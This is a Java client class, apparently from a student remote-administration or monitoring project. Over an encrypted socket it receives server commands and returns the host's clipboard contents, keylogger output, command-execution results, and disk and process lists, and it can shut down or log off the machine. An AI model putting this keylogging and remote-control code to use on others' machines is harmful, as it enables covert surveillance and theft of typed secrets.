/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package User;

import static Server.Server.socket;
import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import java.awt.Dimension;
import java.awt.Image;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.Socket;
import java.util.StringTokenizer;
import javax.imageio.ImageIO;

/**
 *
 * @author Dell
 */
class ReadClient extends Thread {

    private Socket client;
    Image newimg;
    static BufferedImage bimg;
    byte[] bytes;

    public ReadClient(Socket client) {
        this.client = client;

    }

    public void setkey() {
        try {
            DataInputStream dis = new DataInputStream(client.getInputStream());
            String tn = dis.readUTF();
            if (tn.contains("key/server/")) {
                Client.key = tn.substring(11);
            }
        } catch (Exception e) {
        }
    }

    @Override
    public void run() {

        DataInputStream dis = null;
        DataOutputStream dos = null;

        CMDClient cmd = new CMDClient();
        try {

            dis = new DataInputStream(client.getInputStream());
            dos = new DataOutputStream(client.getOutputStream());

            InetAddress name = InetAddress.getLocalHost();
            while (true) {
                String sms = Client.aes.decrypt(dis.readUTF(), Client.key);
                String tam;
                //System.out.println(sms);
                if (sms != null) {
                    String[] nhan = sms.split("/");

                    if (nhan[3].equals("clipboard")) {
                        ClipboardData a = new ClipboardData();
                        tam = "data/" + name.getHostAddress() + "/admin/" + nhan[3] + "/" + a.getClipboardContents();
                        dos.writeUTF(Client.aes.encrypt(tam, Client.key));
                    } else {
                        if (nhan[3].equals("keyslog")) {
                            tam = "data/" + name.getHostAddress() + "/admin/" + nhan[3] + "/" + cmd.dockeyslog();
                            dos.writeUTF(Client.aes.encrypt(tam, Client.key));
                        } else {
                            if (nhan[3].equals("follow")) {
                                tam = "data/" + name.getHostAddress() + "/admin/" + nhan[3] + "/" + cmd.cmd(nhan[3]) + "\n" + cmd.disk() + "\n" + cmd.process();
                                dos.writeUTF(Client.aes.encrypt(tam, Client.key));
                            } else {
                                if (nhan[3].equals("shutdown") || nhan[3].equals("logout")) {
                                    Client.write.exit();
                                    cmd.cmd(nhan[3]);
                                    System.exit(0);
                                } else {
                                    tam = "data/" + name.getHostAddress() + "/admin/" + nhan[3] + "/" + cmd.cmd(nhan[3]);
                                    dos.writeUTF(Client.aes.encrypt(tam, Client.key));
                                }
                            }

                        }

                    }

                }
            }
        } catch (Exception e) {
            try {
                dis.close();
                client.close();
            } catch (IOException ex) {
                System.out.println("Ngắt kết nối Server");
            }
        }
    }

}
